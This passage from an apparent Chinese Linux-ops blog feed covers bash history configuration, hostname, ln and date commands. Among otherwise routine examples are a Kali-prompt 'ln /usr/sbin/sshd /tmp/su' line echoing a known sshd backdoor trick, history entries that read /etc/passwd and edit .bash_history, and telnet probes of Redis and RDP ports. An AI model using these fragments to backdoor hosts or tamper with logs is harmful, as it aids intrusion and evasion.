（Y-M-D格式：2022-08-14）</p><p>%T 时间完整格式（H:M:S格式：17:15:25）</p><p>%c 日期时间完整格式（2022年08月14日 星期日 17时25分30秒）</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">HISTTIMEFORMAT</span>=<span class="hljs-string">&quot;`whoami` %c  &quot;</span><br></code></pre></td></tr></table></figure><h4 id="HISTSIZE-history命令最大显示记录命令数（也就是执行history命令显示的命令条数）"><a href="#HISTSIZE-history命令最大显示记录命令数（也就是执行history命令显示的命令条数）" class="headerlink" title="HISTSIZE history命令最大显示记录命令数（也就是执行history命令显示的命令条数）"></a>HISTSIZE history命令最大显示记录命令数（也就是执行history命令显示的命令条数）</h4><p>export HISTSIZE &#x3D; 100</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ ~]# history | more<br>   19  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:32  history<br>   20  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:32  history<br>   21  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:32  cat /root/.bash_history<br>   22  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:32  cat /etc/passwd<br>   23  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:32  su test<br>  ......<br>  112  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:15:36  history 5<br>  113  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:15:49  pwd a23<br>  114  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:25:12  vim /etc/bashrc<br>  115  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:26:29  ls<br>  116  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:26:35  cat /etc/bashrc<br>  117  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:27:25  vim /root/.bash_history<br>  118  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:28:11  history | more<br></code></pre></td></tr></table></figure><h4 id="HISTFILESIZE-bash-history文件保存记录最大数"><a href="#HISTFILESIZE-bash-history文件保存记录最大数" class="headerlink" title="HISTFILESIZE .bash_history文件保存记录最大数"></a>HISTFILESIZE .bash_history文件保存记录最大数</h4><p>export HISTFILESIZE&#x3D;10</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@iZbp1191gh7vw52537lyxrZ ~]# <span class="hljs-built_in">history</span><br>    1  root 2022年08月14日 星期日 17时32分30秒  <span class="hljs-built_in">cat</span> ~/.bash_history<br>    2  root 2022年08月14日 星期日 17时32分49秒  <span class="hljs-built_in">history</span><br>    3  root 2022年08月14日 星期日 17时34分05秒  <span class="hljs-built_in">date</span><br>    4  root 2022年08月14日 星期日 17时34分38秒  <span class="hljs-built_in">cat</span> ~/.bash_history<br>    5  root 2022年08月14日 星期日 17时34分42秒  <span class="hljs-built_in">history</span> -w<br>    6  root 2022年08月14日 星期日 17时36分56秒  <span class="hljs-built_in">cat</span> /root/.bash_history<br>    7  root 2022年08月14日 星期日 17时47分24秒  <span class="hljs-built_in">pwd</span><br>    8  root 2022年08月14日 星期日 17时47分28秒  <span class="hljs-built_in">ls</span> /tmp<br>    9  root 2022年08月14日 星期日 17时47分34秒  <span class="hljs-built_in">history</span><br>[root@iZbp1191gh7vw52537lyxrZ ~]# <span class="hljs-built_in">cat</span> /root/.bash_history<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-comment">#1660469682</span><br><span class="hljs-built_in">history</span> -w<br><span class="hljs-comment">#1660469519</span><br><span class="hljs-built_in">history</span><br><span class="hljs-comment">#1660469532</span><br>vim /root/.bash_history<br><span class="hljs-comment">#1660469550</span><br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-comment">#1660469569</span><br><span class="hljs-built_in">history</span><br><span class="hljs-comment">#1660469645</span><br><span class="hljs-built_in">date</span><br><span class="hljs-comment">#1660469678</span><br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-comment">#1660469682</span><br><span class="hljs-built_in">history</span> -w<br><span class="hljs-comment">#1660469684</span><br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-comment">#1660469130</span><br><span class="hljs-built_in">history</span><br></code></pre></td></tr></table></figure><h3 id="history配置文件"><a href="#history配置文件" class="headerlink" title="history配置文件"></a>history配置文件</h3><p>新开终端加载新的配置文件</p><h4 id="etc-bashrc-通用配置文件"><a href="#etc-bashrc-通用配置文件" class="headerlink" title="&#x2F;etc&#x2F;bashrc 通用配置文件"></a>&#x2F;etc&#x2F;bashrc 通用配置文件</h4><p>增加配置后所有用户都会生效</p><h4 id="bashrc-各用户独立配置文件，也会加载主配置文件-etc-bashrc"><a href="#bashrc-各用户独立配置文件，也会加载主配置文件-etc-bashrc" class="headerlink" title="~&#x2F;.bashrc 各用户独立配置文件，也会加载主配置文件&#x2F;etc&#x2F;bashrc"></a>~&#x2F;.bashrc 各用户独立配置文件，也会加载主配置文件&#x2F;etc&#x2F;bashrc</h4><p>root默认配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@iZbp1191gh7vw52537lyxrZ ~]# <span class="hljs-built_in">ls</span> ~/.bashrc -l<br>-rw-r--r--. 1 root root 176 12月 29 2013 /root/.bashrc<br>[root@iZbp1191gh7vw52537lyxrZ ~]# <span class="hljs-built_in">cat</span> ~/.bashrc<br><span class="hljs-comment"># .bashrc</span><br><br><span class="hljs-comment"># User specific aliases and functions</span><br><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">rm</span>=<span class="hljs-string">&#x27;rm -i&#x27;</span><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">cp</span>=<span class="hljs-string">&#x27;cp -i&#x27;</span><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">mv</span>=<span class="hljs-string">&#x27;mv -i&#x27;</span><br><br><span class="hljs-comment"># Source global definitions</span><br><span class="hljs-keyword">if</span> [ -f /etc/bashrc ]; <span class="hljs-keyword">then</span><br>. /etc/bashrc<br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>普通用户默认配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">cat</span> ~/.bashrc<br><span class="hljs-comment"># .bashrc</span><br><br><span class="hljs-comment"># Source global definitions</span><br><span class="hljs-keyword">if</span> [ -f /etc/bashrc ]; <span class="hljs-keyword">then</span><br>. /etc/bashrc<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># Uncomment the following line if you don&#x27;t like systemctl&#x27;s auto-paging feature:</span><br><span class="hljs-comment"># export SYSTEMD_PAGER=</span><br><br><span class="hljs-comment"># User specific aliases and functions</span><br></code></pre></td></tr></table></figure><p>配置示例</p><p>root</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@iZbp1191gh7vw52537lyxrZ ~]# <span class="hljs-built_in">cat</span> ~/.bashrc<br><span class="hljs-comment"># .bashrc</span><br><br><span class="hljs-comment"># User specific aliases and functions</span><br><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">rm</span>=<span class="hljs-string">&#x27;rm -i&#x27;</span><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">cp</span>=<span class="hljs-string">&#x27;cp -i&#x27;</span><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">mv</span>=<span class="hljs-string">&#x27;mv -i&#x27;</span><br><br><span class="hljs-comment"># Source global definitions</span><br><span class="hljs-keyword">if</span> [ -f /etc/bashrc ]; <span class="hljs-keyword">then</span><br>. /etc/bashrc<br><span class="hljs-keyword">fi</span><br><br>HISTTIMEFORMAT=<span class="hljs-string">&quot;%F &quot;</span><br></code></pre></td></tr></table></figure><p>root history</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ ~]# history<br>    1  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> telnet 27.221.32.84 3317<br>    2  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> telnet 123.125.204.111 6379<br>    3  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> telnet 123.125.204.64 8500<br>    4  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> telnet 123.126.54.207 3389<br>    5  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> telnet 123.125.204.111 6379<br>    6  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> ls<br>    7  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> ls ~/.bashrc<br>    8  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> ls ~/.bashrc -l<br>    9  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> cat ~/.bashrc<br>   10  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> history<br>   11  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> vim /etc/bashrc<br>   12  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> source /etc/bashrc<br>   13  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> history<br>   14  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> source /etc/bashrc<br>   15  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> history<br></code></pre></td></tr></table></figure><p>test</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nix">[test@iZbp1191gh7vw52537lyxrZ root]$ cat <span class="hljs-symbol">~/.bashrc</span><br><span class="hljs-comment"># .bashrc</span><br><br><span class="hljs-comment"># Source global definitions</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-operator">-</span>f <span class="hljs-symbol">/etc/bashrc</span> ]; <span class="hljs-keyword">then</span><br>. <span class="hljs-symbol">/etc/bashrc</span><br>fi<br>H<span class="hljs-attr">ISTTIMEFORMAT</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;%c &quot;</span><br><span class="hljs-comment"># Uncomment the following line if you don&#x27;t like systemctl&#x27;s auto-paging feature:</span><br><span class="hljs-comment"># export SYSTEMD_PAGER=</span><br><br><span class="hljs-comment"># User specific aliases and functions</span><br></code></pre></td></tr></table></figure><p>source ~&#x2F;.bashrc</p><p>test history</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">history</span><br>    1  2022年08月16日 星期二 23时09分35秒 <span class="hljs-built_in">history</span><br>    2  2022年08月16日 星期二 23时09分35秒 <span class="hljs-built_in">history</span> -w<br>    3  2022年08月16日 星期二 23时09分35秒 <span class="hljs-built_in">history</span><br>    4  2022年08月16日 星期二 23时09分35秒 <span class="hljs-built_in">history</span> -w<br>    5  2022年08月16日 星期二 23时09分35秒 <span class="hljs-built_in">history</span><br>    6  2022年08月16日 星期二 23时09分35秒 <span class="hljs-built_in">ls</span> -lat ~/.bash_history<br>    7  2022年08月13日 星期六 22时56分56秒 <span class="hljs-built_in">history</span><br>    8  2022年08月13日 星期六 22时57分01秒 lll<br>    9  2022年08月13日 星期六 22时57分03秒 <span class="hljs-built_in">history</span><br>   10  2022年08月14日 星期日 10时41分01秒 <span class="hljs-built_in">exit</span><br>   11  2022年08月16日 星期二 23时09分35秒 <span class="hljs-built_in">history</span><br>   12  2022年08月16日 星期二 23时09分35秒 <span class="hljs-built_in">cat</span> ~/.bashrc<br>   13  2022年08月16日 星期二 23时09分53秒 vim ~/.bashrc<br>   14  2022年08月16日 星期二 23时10分59秒 <span class="hljs-built_in">source</span> ~/.bashrc<br>   15  2022年08月16日 星期二 23时11分01秒 <span class="hljs-built_in">history</span><br>   16  2022年08月16日 星期二 23时11分27秒 <span class="hljs-built_in">cat</span> ~/.bashrc<br>   17  2022年08月16日 星期二 23时12分14秒 vim ~/.bashrc<br>   18  2022年08月16日 星期二 23时12分28秒 <span class="hljs-built_in">source</span> ~/.bashrc<br>   19  2022年08月16日 星期二 23时12分42秒 <span class="hljs-built_in">history</span><br></code></pre></td></tr></table></figure><p>默认情况下，</p><p>配置文件示例</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">HISTTIMEFORMAT</span>=<span class="hljs-string">&quot;`whoami` %c  &quot;</span><br><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">HISTSIZE</span>=100<br><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">HISTFILESIZE</span>=10<br></code></pre></td></tr></table></figure><h2 id="关注点"><a href="#关注点" class="headerlink" title="关注点"></a>关注点</h2><p>1、默认情况下退出终端（会话）后，会将历史记录写入～&#x2F;.bash_history文件</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hostname</title>
    <link href="/2024/04/03/yunwei/yunweicommands/Linuxcommands/hostname/"/>
    <url>/2024/04/03/yunwei/yunweicommands/Linuxcommands/hostname/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>显示系统主机名</p><h2 id="查看主机名"><a href="#查看主机名" class="headerlink" title="查看主机名"></a>查看主机名</h2><p>命令</p><p>hostname </p><p>cenots6：读取的是 &#x2F;etc&#x2F;sysconfig&#x2F;network 中的配置</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[root@rdimtools1.ops.xlzbb1 /tmp]</span><span class="hljs-comment"># cat /etc/sysconfig/network</span><br><span class="hljs-attr">NETWORKING</span>=<span class="hljs-literal">yes</span><br><span class="hljs-attr">HOSTNAME</span>=rdimtools1.ops.xlzbb1.node.com<br></code></pre></td></tr></table></figure><p>centos7,8&#x2F;ubuntu：读取的是 &#x2F;etc&#x2F;hostname中的值</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@110</span> cron.d]<span class="hljs-meta"># cat /etc/hostname</span><br><span class="hljs-number">110</span><br></code></pre></td></tr></table></figure><h2 id="设置主机名"><a href="#设置主机名" class="headerlink" title="设置主机名"></a>设置主机名</h2><p>centos6可以设置带有”:”这种特殊字符的主机名。</p><p>​存在本机使用SMTP时，ehlo报错。</p><p>centos7不可以设置带有”:”这种特殊字符的主机名</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">(base) [root@<span class="hljs-number">110</span> ~]# <span class="hljs-built_in">hostname</span> <span class="hljs-number">110</span>:<span class="hljs-number">1234</span><br><span class="hljs-built_in">hostname</span>: the specified <span class="hljs-built_in">hostname</span> <span class="hljs-keyword">is</span> invalid<br></code></pre></td></tr></table></figure><h3 id="临时设置"><a href="#临时设置" class="headerlink" title="临时设置"></a>临时设置</h3><p><strong>hostname 主机名</strong></p><p>不需要重启，新开终端之后就是新设置的hostname</p><p>重启之后，临时hostname失效</p><h3 id="永久设置"><a href="#永久设置" class="headerlink" title="永久设置"></a>永久设置</h3><p>需要重启</p><p><strong>hostnamectl命令方式</strong></p><p>hostnamectl set-hostname hostname</p><p>会修改&#x2F;etc&#x2F;hostname的文件内容</p><p><strong>修改文件方式</strong></p><p>centos6</p><p>修改 &#x2F;etc&#x2F;sysconfig&#x2F;network 中的HOSTNAME字段</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">vim /etc/sysconfig<span class="hljs-built_in">/network</span><br><span class="hljs-built_in"></span><br><span class="hljs-attribute">NETWORKING</span>=<span class="hljs-literal">yes</span><br><span class="hljs-attribute">HOSTNAME</span>=iZ8vb4dup6si15ggr13rt4Z<br><span class="hljs-attribute">NETWORKING_IPV6</span>=<span class="hljs-literal">no</span><br><span class="hljs-attribute">PEERNTP</span>=<span class="hljs-literal">no</span><br></code></pre></td></tr></table></figure><p>centos7</p><p>修改&#x2F;etc&#x2F;hostname中的内容即可</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">vim</span> /etc/<span class="hljs-built_in">hostname</span><br><br><span class="hljs-number">120</span><br></code></pre></td></tr></table></figure><h3 id="hostnamectl"><a href="#hostnamectl" class="headerlink" title="hostnamectl"></a>hostnamectl</h3><p>获取服务器主机名</p><p>hostnamectl</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs nix">(base) [root@<span class="hljs-number">120</span> ~]<span class="hljs-comment"># hostnamectl</span><br>   Static <span class="hljs-params">hostname:</span> <span class="hljs-number">110</span><br>         Icon <span class="hljs-params">name:</span> computer-vm<br>           <span class="hljs-params">Chassis:</span> vm<br>        Machine <span class="hljs-params">ID:</span> f0f31005fb5a436d88e3c6cbf54e25aa<br>           Boot <span class="hljs-params">ID:</span> <span class="hljs-number">4304</span>a1d611aa4086a7aeb527a884dbd1<br>    <span class="hljs-params">Virtualization:</span> kvm<br>  Operating <span class="hljs-params">System:</span> CentOS Linux <span class="hljs-number">7</span> (Core)<br>       CPE OS <span class="hljs-params">Name:</span> cpe:<span class="hljs-operator">/</span>o:centos:centos:<span class="hljs-number">7</span><br>            <span class="hljs-params">Kernel:</span> Linux <span class="hljs-number">3.10</span>.<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">1160.36</span>.<span class="hljs-number">2</span>.el7.x86_64<br>      <span class="hljs-params">Architecture:</span> x86-<span class="hljs-number">64</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ln</title>
    <link href="/2024/04/03/yunwei/yunweicommands/Linuxcommands/ln/"/>
    <url>/2024/04/03/yunwei/yunweicommands/Linuxcommands/ln/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>为文件创建链接，默认创建的均为硬链接</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p><strong>ln [OPTION]… [-T] TARGET LINK_NAME</strong></p><p>为TARGET创建链接为LINK_NAME</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">(base) [root@110 ~]# <span class="hljs-built_in">ln</span> /etc/passwd <span class="hljs-built_in">test</span><br>(base) [root@110 ~]# <span class="hljs-built_in">ls</span> -la <span class="hljs-built_in">test</span><br>-rw-r--r-- 2 root root 1343 Dec 16 00:13 <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p><strong>ln [OPTION]… TARGET</strong></p><p>为TARGET创建链接在当前目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">(base) [root@110 <span class="hljs-built_in">test</span>]# <span class="hljs-built_in">ln</span> /etc/passwd<br>(base) [root@110 <span class="hljs-built_in">test</span>]# <span class="hljs-built_in">ls</span><br>passwd<br>(base) [root@110 <span class="hljs-built_in">test</span>]# <span class="hljs-built_in">ls</span> -ilh passwd<br>932192 -rw-r--r-- 2 root root 1.4K Dec 16 00:13 passwd<br>(base) [root@110 <span class="hljs-built_in">test</span>]# <span class="hljs-built_in">ls</span> -ilh /etc/passwd<br>932192 -rw-r--r-- 2 root root 1.4K Dec 16 00:13 /etc/passwd<br></code></pre></td></tr></table></figure><p><strong>ln [OPTION]… TARGET… DIRECTORY</strong><br><strong>ln [OPTION]… -t DIRECTORY TARGET…</strong></p><p>创建指向DIRECTORY中的每个TARGET的链接</p><p>参数</p><p>-s, –symbolic</p><p>make symbolic links instead of hard links</p><p>使用符号链接（软连接）替换硬链接</p><p>-f, –force</p><p>remove existing destination files</p><p>删除已有的目标文件，避免出现</p><p><strong>备注</strong></p><p>1、默认为硬链接。</p><p>2、LINK_NAME（也就是链接名）必须为不存在的，也就是链接名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root💀kali2021)-[~]<br>└─# <span class="hljs-built_in">ln</span> /usr/sbin/sshd /tmp/su<br><span class="hljs-built_in">ln</span>: 无法创建硬链接 <span class="hljs-string">&#x27;/tmp/su&#x27;</span>: 文件已存在<br></code></pre></td></tr></table></figure><p>3、硬链接时，源文件必须存在</p><p>4、软连接时，源文件可不存在</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">(base) [root@110 <span class="hljs-built_in">test</span>]# <span class="hljs-built_in">ln</span> -s /etc/passwds passwds<br>(base) [root@110 <span class="hljs-built_in">test</span>]# <span class="hljs-built_in">ls</span> -lia passwds<br>918146 lrwxrwxrwx 1 root root 12 Jan  3 15:05 passwds -&gt; /etc/passwds<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>data&amp;time</title>
    <link href="/2024/04/03/yunwei/yunweicommands/Linuxcommands/date&amp;time/"/>
    <url>/2024/04/03/yunwei/yunweicommands/Linuxcommands/date&amp;time/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>获取和设置主机日期时间</p><h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><h3 id="获取主机当前时间"><a href="#获取主机当前时间" class="headerlink" title="获取主机当前时间"></a>获取主机当前时间</h3><p>date</p><p>date -R</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tap">ubuntu@VM-8-5-ubuntu:~$ date<br>Mon<span class="hljs-number"> 15 </span>Nov<span class="hljs-number"> 2021 </span>06:29:10 PM CST<br><br>(base) root@VM-8-5-ubuntu:~<span class="hljs-comment"># date -R</span><br>Thu,<span class="hljs-number"> 19 </span>May<span class="hljs-number"> 2022 </span>22:29:17 +0800<br><br>(base) [root@120 ~]<span class="hljs-comment"># date</span><br>Mon Nov<span class="hljs-number"> 15 </span>18:24:00 CST 2021<br></code></pre></td></tr></table></figure><h3 id="修改日期"><a href="#修改日期" class="headerlink" title="修改日期"></a>修改日期</h3><p>需要root权限</p><p><strong>sudo date -s “YYYY-MM-DD hh:mm[:ss]”</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ubuntu</span>@VM-<span class="hljs-number">8</span>-<span class="hljs-number">5</span>-ubuntu:~$ sudo date -s <span class="hljs-string">&quot;2022-11-15 13:14:15&quot;</span><br><span class="hljs-attribute">Tue</span> <span class="hljs-number">15</span> Nov <span class="hljs-number">2022</span> <span class="hljs-number">01</span>:<span class="hljs-number">14</span>:<span class="hljs-number">15</span> PM CST<br></code></pre></td></tr></table></figure><h3 id="修改时间"><a href="#修改时间" class="headerlink" title="修改时间"></a>修改时间</h3><p>需要root权限</p><p><strong>sudo date -s hh:mm[:ss]</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ubuntu</span>@VM-<span class="hljs-number">8</span>-<span class="hljs-number">5</span>-ubuntu:~$ sudo date -s <span class="hljs-number">19</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br><span class="hljs-attribute">Mon</span> <span class="hljs-number">15</span> Nov <span class="hljs-number">2021</span> <span class="hljs-number">07</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> PM CST<br></code></pre></td></tr></table></figure><h3 id="更新时间"><a href="#更新时间" class="headerlink" title="更新时间"></a>更新时间</h3><h4 id="安装-ntpdate"><a href="#安装-ntpdate" class="headerlink" title="安装 ntpdate"></a>安装 ntpdate</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">apt</span> install ntpdate         # version <span class="hljs-number">1</span>:<span class="hljs-number">4</span>.<span class="hljs-number">2</span>.<span class="hljs-number">8</span>p12+dfsg-<span class="hljs-number">3</span>ubuntu<span class="hljs-number">4.20.04.1</span>, or<br><br><span class="hljs-attribute">apt</span> install ntpsec-ntpdate  # version <span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">8</span>+dfsg1-<span class="hljs-number">4</span>build1<br></code></pre></td></tr></table></figure><h4 